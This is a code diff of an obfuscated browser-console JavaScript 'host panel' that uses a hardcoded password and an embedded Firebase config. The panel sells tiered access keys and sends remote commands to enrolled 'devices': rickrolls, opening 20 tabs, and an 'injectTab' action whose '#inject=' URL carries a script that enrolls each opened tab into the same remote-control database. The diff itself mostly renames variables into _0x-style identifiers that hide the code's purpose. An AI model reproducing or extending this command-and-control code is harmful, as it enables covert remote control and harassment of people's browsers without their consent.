@@ -1,241 +1,241 @@
 (async () => {
-  const password = prompt("Enter host password:");
-  if (password !== 'mosesischill') {
+  const _0xff6d3c = prompt("Enter host password:");
+  if (_0xff6d3c !== 'mosesischill') {
     return alert("❌ Incorrect password.");
   }
-
-  const loadingDiv = document.createElement("div");
-  loadingDiv.style.cssText = `
-    position: fixed;
-    top: 50%;
-    left: 50%;
-    transform: translate(-50%, -50%);
-    font-size: 20px;
-    color: white;
-    z-index: 99999;
-  `;
-  loadingDiv.innerHTML = "Loading Firebase...";
-  document.body.appendChild(loadingDiv);
-
-  // Load Firebase if not already loaded
+  const _0x2ed075 = document.createElement("div");
+  _0x2ed075.style.cssText = "\n    position: fixed;\n    top: 50%;\n    left: 50%;\n    transform: translate(-50%, -50%);\n    font-size: 20px;\n    color: white;\n    z-index: 99999;\n  ";
+  _0x2ed075.innerHTML = "Loading Firebase...";
+  document.body.appendChild(_0x2ed075);
   if (!window.firebase) {
-    const firebaseAppScript = document.createElement("script");
-    firebaseAppScript.src = "https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js";
-    document.head.appendChild(firebaseAppScript);
-    await new Promise(resolve => firebaseAppScript.onload = resolve);
-
-    const firebaseDatabaseScript = document.createElement("script");
-    firebaseDatabaseScript.src = "https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js";
-    document.head.appendChild(firebaseDatabaseScript);
-    await new Promise(resolve => firebaseDatabaseScript.onload = resolve);
+    const _0xe21dfd = document.createElement("script");
+    _0xe21dfd.src = "https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js";
+    document.head.appendChild(_0xe21dfd);
+    await new Promise(_0x1dab19 => _0xe21dfd.onload = _0x1dab19);
+    const _0x43ca7a = document.createElement("script");
+    _0x43ca7a.src = "https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js";
+    document.head.appendChild(_0x43ca7a);
+    await new Promise(_0x57f2f7 => _0x43ca7a.onload = _0x57f2f7);
   }
-
-  const firebaseConfig = {
-    apiKey: 'AIzaSyD5hBBFtSWYOMIk1ZeLqcUKsAubdok4FWk',
-    authDomain: "nebcasino-5aca1.firebaseapp.com",
-    databaseURL: "https://nebcasino-5aca1-default-rtdb.firebaseio.com",
-    projectId: "nebcasino-5aca1",
-    storageBucket: "nebcasino-5aca1.appspot.com",
-    messagingSenderId: "907673467348",
-    appId: '1:907673467348:web:37b0bcbad757f95845fe41'
+  const _0x214214 = {
+    'apiKey': 'AIzaSyD5hBBFtSWYOMIk1ZeLqcUKsAubdok4FWk',
+    'authDomain': "nebcasino-5aca1.firebaseapp.com",
+    'databaseURL': "https://nebcasino-5aca1-default-rtdb.firebaseio.com",
+    'projectId': "nebcasino-5aca1",
+    'storageBucket': "nebcasino-5aca1.appspot.com",
+    'messagingSenderId': "907673467348",
+    'appId': '1:907673467348:web:37b0bcbad757f95845fe41'
   };
-
-  firebase.initializeApp(firebaseConfig);
-  const database = firebase.database();
-  const devicesRef = database.ref("sessions/public/devices");
-  const keysRef = database.ref("sessions/public/keys");
-
-  // Create and style the host panel
-  const hostPanel = document.createElement("div");
-  hostPanel.style.cssText = `
-    position: fixed;
-    top: 50px;
-    left: 50px;
-    padding: 20px;
-    background: black;
-    color: white;
-    font-family: sans-serif;
-    border: 2px solid white;
-    border-radius: 10px;
-    z-index: 99999;
-    max-height: 90vh;
-    overflow: auto;
-    opacity: 0;
-    transform: translateY(-50px);
-    transition: opacity 0.5s, transform 0.5s;
-  `;
-  hostPanel.innerHTML = "<h2>🌌 Host Panel - Devices</h2>";
-  document.body.appendChild(hostPanel);
-
-  const keyManagementDiv = document.createElement("div");
-  keyManagementDiv.style.marginTop = "10px";
-  hostPanel.appendChild(keyManagementDiv);
-
-  const keyManagementHeader = document.createElement("div");
-  keyManagementHeader.style.cssText = "margin-top:20px;padding-top:20px;border-top:1px solid white";
-  keyManagementHeader.innerHTML = "<h3>🔑 Key Management</h3>";
-  hostPanel.appendChild(keyManagementHeader);
-
-  // Key creation form
-  const keyInput = document.createElement("input");
-  keyInput.placeholder = "Enter new key (e.g. ABC123)";
-  keyInput.style.marginRight = '5px';
-
-  const usesInput = document.createElement("input");
-  usesInput.type = "number";
-  usesInput.placeholder = "Uses";
-  usesInput.style.width = "60px";
-  usesInput.style.marginRight = "5px";
-
-  const levelSelect = document.createElement("select");
-  ["Lite", 'Normal', 'Normal+', "Elite", "Elite+", "Elite++"].forEach(level => {
-    const option = document.createElement("option");
-    option.value = level;
-    option.textContent = level;
-    levelSelect.appendChild(option);
+  firebase.initializeApp(_0x214214);
+  const _0x249c0c = firebase.database();
+  const _0x2a6858 = _0x249c0c.ref("sessions/public/devices");
+  const _0x1e921c = _0x249c0c.ref("sessions/public/keys");
+  const _0x47d3f5 = document.createElement("div");
+  _0x47d3f5.style.cssText = "\n    position: fixed;\n    top: 50px;\n    left: 50px;\n    padding: 20px;\n    background: black;\n    color: white;\n    font-family: sans-serif;\n    border: 2px solid white;\n    border-radius: 10px;\n    z-index: 99999;\n    max-height: 90vh;\n    overflow: auto;\n    opacity: 0;\n    transform: translateY(-50px);\n    transition: opacity 0.5s, transform 0.5s;\n  ";
+  document.body.appendChild(_0x47d3f5);
+  _0x47d3f5.innerHTML = "<h2>🌌 Host Panel - Devices</h2>";
+  const _0x1f9312 = document.createElement('div');
+  _0x1f9312.style.marginTop = "10px";
+  _0x47d3f5.appendChild(_0x1f9312);
+  const _0x1bc088 = document.createElement("div");
+  _0x1bc088.style.cssText = "margin-top:20px;padding-top:20px;border-top:1px solid white";
+  _0x1bc088.innerHTML = "<h3>🔑 Key Management</h3>";
+  _0x47d3f5.appendChild(_0x1bc088);
+  const _0x15b667 = document.createElement("input");
+  _0x15b667.placeholder = "Enter new key (e.g. ABC123)";
+  _0x15b667.style.marginRight = '5px';
+  const _0x157c39 = document.createElement("input");
+  _0x157c39.type = "number";
+  _0x157c39.placeholder = "Uses";
+  _0x157c39.style.width = "60px";
+  _0x157c39.style.marginRight = "5px";
+  const _0x3530cb = document.createElement('select');
+  ["Lite", 'Normal', 'Normal+', "Elite", "Elite+", "Elite++"].forEach(_0x2decd9 => {
+    const _0x22380a = document.createElement("option");
+    _0x22380a.value = _0x2decd9;
+    _0x22380a.textContent = _0x2decd9;
+    _0x3530cb.appendChild(_0x22380a);
   });
-  levelSelect.style.marginRight = "5px";
-
-  const createKeyButton = document.createElement("button");
-  createKeyButton.textContent = "➕ Create Key";
-  createKeyButton.onclick = () => {
-    const key = keyInput.value.trim();
-    const uses = parseInt(usesInput.value);
-    const level = levelSelect.value;
-
-    if (!key || isNaN(uses) || uses <= 0) {
+  _0x3530cb.style.marginRight = "5px";
+  const _0x406947 = document.createElement("button");
+  _0x406947.textContent = "➕ Create Key";
+  _0x406947.onclick = () => {
+    const _0x287b20 = _0x15b667.value.trim();
+    const _0x4164b4 = parseInt(_0x157c39.value);
+    const _0x55d5d3 = _0x3530cb.value;
+    if (!_0x287b20 || isNaN(_0x4164b4) || _0x4164b4 <= 0x0) {
       return alert("❌ Invalid key or uses.");
     }
-
-    keysRef.child(key).set({
-      usesLeft: uses,
-      level: level,
-      created: Date.now()
+    _0x1e921c.child(_0x287b20).set({
+      'usesLeft': _0x4164b4,
+      'level': _0x55d5d3,
+      'created': Date.now()
     }).then(() => {
-      alert(`✅ Key "${key}" created!`);
-      keyInput.value = '';
-      usesInput.value = '';
-      updateKeyList();
+      alert("✅ Key \"" + _0x287b20 + "\" created!");
+      _0x15b667.value = '';
+      _0x157c39.value = '';
+      _0x587778();
     });
   };
-
-  [keyInput, usesInput, levelSelect, createKeyButton].forEach(el => keyManagementHeader.appendChild(el));
-
-  const keyListDiv = document.createElement("div");
-  keyListDiv.style.marginTop = "20px";
-  keyManagementHeader.appendChild(keyListDiv);
-
-  // Function to update the key list
-  function updateKeyList() {
-    keysRef.on('value', snapshot => {
-      const keys = snapshot.val() || {};
-      keyListDiv.innerHTML = '';
-      Object.entries(keys).forEach(([key, data]) => {
-        const keyElement = document.createElement("div");
-        keyElement.style.cssText = "border:1px solid gray;padding:8px;margin:5px 0";
-        keyElement.innerHTML = `
-          <b>${key}</b> - ${data.usesLeft} uses left - Level: <b>${data.level}</b>
-          <br><small>Created: ${new Date(data.created).toLocaleString()}</small>
-        `;
-
-        const deleteButton = document.createElement("button");
-        deleteButton.textContent = "❌ Delete";
-        deleteButton.style.marginLeft = "10px";
-        deleteButton.onclick = () => {
-          if (confirm(`Delete key "${key}"?`)) {
-            keysRef.child(key).remove();
+  [_0x15b667, _0x157c39, _0x3530cb, _0x406947].forEach(_0x4d3e3d => _0x1bc088.appendChild(_0x4d3e3d));
+  const _0x30fd38 = document.createElement("div");
+  _0x30fd38.style.marginTop = "20px";
+  _0x1bc088.appendChild(_0x30fd38);
+  function _0x587778() {
+    _0x1e921c.on('value', _0x173a57 => {
+      const _0x339b74 = _0x173a57.val() || {};
+      _0x30fd38.innerHTML = '';
+      Object.entries(_0x339b74).forEach(([_0x329d3b, _0x3f57af]) => {
+        const _0x1c9967 = document.createElement("div");
+        _0x1c9967.style.cssText = "border:1px solid gray;padding:8px;margin:5px 0";
+        _0x1c9967.innerHTML = "\n        <b>" + _0x329d3b + "</b> - " + _0x3f57af.usesLeft + " uses left - Level: <b>" + _0x3f57af.level + "</b>\n        <br><small>Created: " + new Date(_0x3f57af.created).toLocaleString() + "</small>\n      ";
+        const _0x5a636b = document.createElement("button");
+        _0x5a636b.textContent = "❌ Delete";
+        _0x5a636b.style.marginLeft = "10px";
+        _0x5a636b.onclick = () => {
+          if (confirm("Delete key \"" + _0x329d3b + "\"?")) {
+            _0x1e921c.child(_0x329d3b).remove();
           }
         };
-
-        keyElement.appendChild(deleteButton);
-        keyListDiv.appendChild(keyElement);
+        _0x1c9967.appendChild(_0x5a636b);
+        _0x30fd38.appendChild(_0x1c9967);
       });
     });
   }
-
-  const logDiv = document.createElement("div");
-  logDiv.style.cssText = "margin-top:30px;border-top:1px solid white;padding-top:20px";
-  logDiv.innerHTML = "<h3>📜 Use Log</h3>";
-  hostPanel.appendChild(logDiv);
-
-  const logContainer = document.createElement('div');
-  logDiv.appendChild(logContainer);
-
-  const useLogRef = database.ref("sessions/public/logs/uses");
-  useLogRef.on("value", snapshot => {
-    const logs = snapshot.val() || {};
-    const sortedLogs = Object.entries(logs).sort((a, b) => b[1].timestamp - a[1].timestamp);
-    logContainer.innerHTML = '';
-
-    sortedLogs.forEach(([logId, log]) => {
-      const logElement = document.createElement("div");
-      logElement.style.cssText = "margin-bottom: 10px; font-size: 14px;";
-      logElement.innerHTML = `🕒 <b>${new Date(log.timestamp).toLocaleTimeString()}</b>: 
-        <i>${log.triggeredBy}</i> used <b>${log.key}</b> on <b>${log.targetDeviceName}</b>`;
-      logContainer.appendChild(logElement);
+  const _0x3fb399 = document.createElement("div");
+  _0x3fb399.style.cssText = "margin-top:30px;border-top:1px solid white;padding-top:20px";
+  _0x3fb399.innerHTML = "<h3>📜 Use Log</h3>";
+  _0x47d3f5.appendChild(_0x3fb399);
+  const _0x52cc26 = document.createElement('div');
+  _0x3fb399.appendChild(_0x52cc26);
+  const _0xa8d91c = _0x249c0c.ref("sessions/public/logs/uses");
+  _0xa8d91c.on("value", _0xe12222 => {
+    const _0x53c4b5 = _0xe12222.val() || {};
+    const _0x7feb79 = Object.entries(_0x53c4b5).sort((_0x5719f1, _0x3bf6f7) => _0x3bf6f7[0x1].timestamp - _0x5719f1[0x1].timestamp);
+    _0x52cc26.innerHTML = '';
+    _0x7feb79.forEach(([_0x309bcc, _0xd1868e]) => {
+      const _0x5c2ab1 = document.createElement("div");
+      _0x5c2ab1.style.cssText = "margin-bottom: 10px; font-size: 14px;";
+      _0x5c2ab1.innerHTML = "🕒 <b>" + new Date(_0xd1868e.timestamp).toLocaleTimeString() + "</b>: \n      <i>" + _0xd1868e.triggeredBy + "</i> used <b>" + _0xd1868e.key + "</b> on <b>" + _0xd1868e.targetDeviceName + "</b>";
+      _0x52cc26.appendChild(_0x5c2ab1);
     });
   });
-
-  const clearLogsButton = document.createElement('button');
-  clearLogsButton.textContent = "🧹 Clear Usage Logs";
-  clearLogsButton.style.marginTop = '10px';
-  clearLogsButton.onclick = () => {
+  _0x3fb399.appendChild(_0x52cc26);
+  const _0x3f55fd = document.createElement('button');
+  _0x3f55fd.textContent = "🧹 Clear Usage Logs";
+  _0x3f55fd.style.marginTop = '10px';
+  _0x3f55fd.onclick = () => {
     if (confirm("Are you sure you want to delete all usage logs?")) {
-      useLogRef.remove().then(() => alert("✅ Usage logs cleared.")).catch(err => alert(`❌ Error clearing logs: ${err.message}`));
+      _0xa8d91c.remove().then(() => alert("✅ Usage logs cleared."))["catch"](_0x36dda7 => alert("❌ Error clearing logs: " + _0x36dda7.message));
     }
   };
-  logDiv.appendChild(clearLogsButton);
-
-  updateKeyList();
-
+  _0x3fb399.appendChild(_0x3f55fd);
+  _0x587778();
   setTimeout(() => {
-    hostPanel.style.opacity = '1';
-    hostPanel.style.transform = "translateY(0)";
-  }, 500);
-
+    _0x47d3f5.style.opacity = '1';
+    _0x47d3f5.style.transform = "translateY(0)";
+  }, 0x1f4);
   setTimeout(() => {
-    loadingDiv.style.display = "none";
-  }, 1500);
+    _0x2ed075.style.display = "none";
+  }, 0x5dc);
+  const _0x57f5f3 = () => {
+    _0x2a6858.once("value", _0x2eac72 => {
+      _0x47d3f5.querySelectorAll(".device").forEach(_0x39f0ed => _0x39f0ed.remove());
+      const _0x5d346f = _0x2eac72.val() || {};
+      Object.entries(_0x5d346f).forEach(([_0x335fd3, _0x557cfe]) => {
+        const _0x1b313f = document.createElement('div');
+        _0x1b313f.className = "device";
+        _0x1b313f.style.cssText = "border:1px solid white;padding:10px;margin:10px 0";
+        const _0x30dcbe = document.createElement('input');
+        _0x30dcbe.value = _0x557cfe.name || "Unnamed (" + _0x335fd3 + ')';
+        _0x30dcbe.style.width = "150px";
+        _0x1b313f.appendChild(_0x30dcbe);
+        const _0x190a08 = _0x557cfe.lastSeen || 0x0;
+        const _0x4c15ce = Date.now() - _0x190a08;
+  const _0x335cdd = _0x557cfe.online === true;
+const _0x97a406 = _0x190a08 ? new Date(_0x190a08).toLocaleTimeString() : "never";
+const _0x1aa752 = document.createElement("span");
+_0x1aa752.innerHTML = " | <b>" + (_0x335cdd ? "🟢 Online" : "🔴 Offline") + "</b> (Last seen: " + _0x97a406 + ")";
 
-  // Device management and interactions
-  const refreshDevices = () => {
-    devicesRef.once("value", snapshot => {
-      hostPanel.querySelectorAll(".device").forEach(device => device.remove());
-      const devices = snapshot.val() || {};
-
-      Object.entries(devices).forEach(([deviceId, deviceData]) => {
-        const deviceElement = document.createElement('div');
-        deviceElement.className = "device";
-        deviceElement.style.cssText = "border:1px solid white;padding:10px;margin:10px 0";
-
-        const deviceNameInput = document.createElement('input');
-        deviceNameInput.value = deviceData.name || `Unnamed (${deviceId})`;
-        deviceNameInput.style.width = "150px";
-        deviceElement.appendChild(deviceNameInput);
-
-        const lastSeen = deviceData.lastSeen || 0;
-        const timeSinceLastSeen = Date.now() - lastSeen;
-        const isOnline = timeSinceLastSeen < 60000;
-        const lastSeenText = deviceData.lastSeen ? new Date(deviceData.lastSeen).toLocaleTimeString() : "never";
-
-        const statusSpan = document.createElement("span");
-        statusSpan.innerHTML = `Last seen: ${lastSeenText} | Status: ${isOnline ? "Online" : "Offline"}`;
-        deviceElement.appendChild(statusSpan);
-
-        const removeDeviceButton = document.createElement('button');
-        removeDeviceButton.textContent = "❌ Remove Device";
-        removeDeviceButton.onclick = () => {
-          if (confirm(`Remove device "${deviceData.name}"?`)) {
-            devicesRef.child(deviceId).remove();
-          }
+        _0x1b313f.appendChild(_0x1aa752);
+        const _0x6f72c6 = document.createElement("button");
+        _0x6f72c6.textContent = "Save Name";
+        _0x6f72c6.style.marginLeft = '10px';
+        _0x6f72c6.onclick = () => {
+          _0x2a6858.child(_0x335fd3).update({
+            'name': _0x30dcbe.value
+          });
         };
-
-        deviceElement.appendChild(removeDeviceButton);
-        hostPanel.appendChild(deviceElement);
+        _0x1b313f.appendChild(_0x6f72c6);
+        const _0x33a583 = document.createElement("label");
+        _0x33a583.textContent = " Level: ";
+        _0x33a583.style.marginLeft = "10px";
+        const _0x469954 = document.createElement('select');
+        ['Lite', 'Normal', "Normal+", 'Elite', "Elite+", "Elite++"].forEach(_0x24eb02 => {
+          const _0x38c36d = document.createElement("option");
+          _0x38c36d.value = _0x24eb02;
+          _0x38c36d.textContent = _0x24eb02;
+          _0x469954.appendChild(_0x38c36d);
+        });
+        _0x469954.value = _0x557cfe.level || 'Lite';
+        const _0x3627ee = document.createElement("button");
+        _0x3627ee.textContent = "Update Level";
+        _0x3627ee.style.marginLeft = "5px";
+        _0x3627ee.onclick = () => {
+          _0x2a6858.child(_0x335fd3).update({
+            'level': _0x469954.value
+          }).then(() => {});
+        };
+        _0x1b313f.appendChild(_0x33a583);
+        _0x1b313f.appendChild(_0x469954);
+        _0x1b313f.appendChild(_0x3627ee);
+        const _0x30f487 = document.createElement("button");
+        _0x30f487.textContent = "Rick Roll";
+        _0x30f487.style.marginLeft = "10px";
+        _0x30f487.onclick = () => {
+          _0x249c0c.ref("sessions/public/devices/" + _0x335fd3 + '/action').set("rickroll");
+        };
+        _0x1b313f.appendChild(_0x30f487);
+        const _0x1565ba = document.createElement('button');
+        _0x1565ba.textContent = "Open 20 Tabs";
+        _0x1565ba.style.marginLeft = "10px";
+        _0x1565ba.onclick = () => {
+          _0x249c0c.ref("sessions/public/devices/" + _0x335fd3 + "/action").set("tabs");
+        };
+        _0x1b313f.appendChild(_0x1565ba);
+        const _0xa0e538 = document.createElement("input");
+        _0xa0e538.placeholder = "https://example.com";
+        _0xa0e538.style.margin = "5px";
+        _0xa0e538.style.padding = "3px";
+        _0xa0e538.style.width = "160px";
+        _0x1b313f.appendChild(_0xa0e538);
+        const _0x31420f = document.createElement('button');
+        _0x31420f.textContent = "🌐 Open on this device";
+        _0x31420f.style.margin = "5px";
+        _0x31420f.onclick = () => {
+          const _0x2ac415 = _0xa0e538.value.trim();
+          if (!_0x2ac415.startsWith("http")) {
+            return alert("❌ Invalid URL");
+          }
+          const _0x2fc0d2 = encodeURIComponent("(async () => {\n            const deviceId = 'dev_' + Math.random().toString(36).substring(2, 10);\n            const loadFirebase = async () => {\n              const s1 = document.createElement('script');\n              s1.src = 'https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js';\n              document.head.appendChild(s1);\n              await new Promise(res => s1.onload = res);\n              const s2 = document.createElement('script');\n              s2.src = 'https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js';\n              document.head.appendChild(s2);\n              await new Promise(res => s2.onload = res);\n            };\n            await loadFirebase();\n            firebase.initializeApp(" + JSON.stringify(_0x214214) + ");\n            const db = firebase.database();\n            const ref = db.ref('sessions/public/devices/' + deviceId);\n            const update = () => ref.update({ online: true, lastSeen: Date.now() });\n            update();\n            setInterval(update, 60000);\n            window.addEventListener(\"beforeunload\", () => ref.update({ online: false, lastSeen: Date.now() }));\n            ref.onDisconnect().update({ online: false, lastSeen: Date.now() });\n            ref.child(\"action\").on(\"value\", () => {});\n          })();");
+          const _0xe0ebba = _0x2ac415 + "#inject=" + _0x2fc0d2;
+          _0x249c0c.ref('sessions/public/devices/' + _0x335fd3 + "/action").set({
+            'type': "injectTab",
+            'url': _0xe0ebba
+          });
+        };
+        _0x1b313f.appendChild(_0x31420f);
+        const _0x4b2cdc = document.createElement("button");
+        _0x4b2cdc.textContent = "❌ Delete";
+        _0x4b2cdc.style.marginLeft = "10px";
+        _0x4b2cdc.style.color = "red";
+        _0x4b2cdc.onclick = () => {
+          _0x2a6858.child(_0x335fd3).remove();
+        };
+        _0x1b313f.appendChild(_0x4b2cdc);
+        _0x47d3f5.appendChild(_0x1b313f);
       });
     });
   };
-
-  refreshDevices();
-  setInterval(refreshDevices, 30000);
+  _0x2a6858.on("value", _0x57f5f3);
 })();
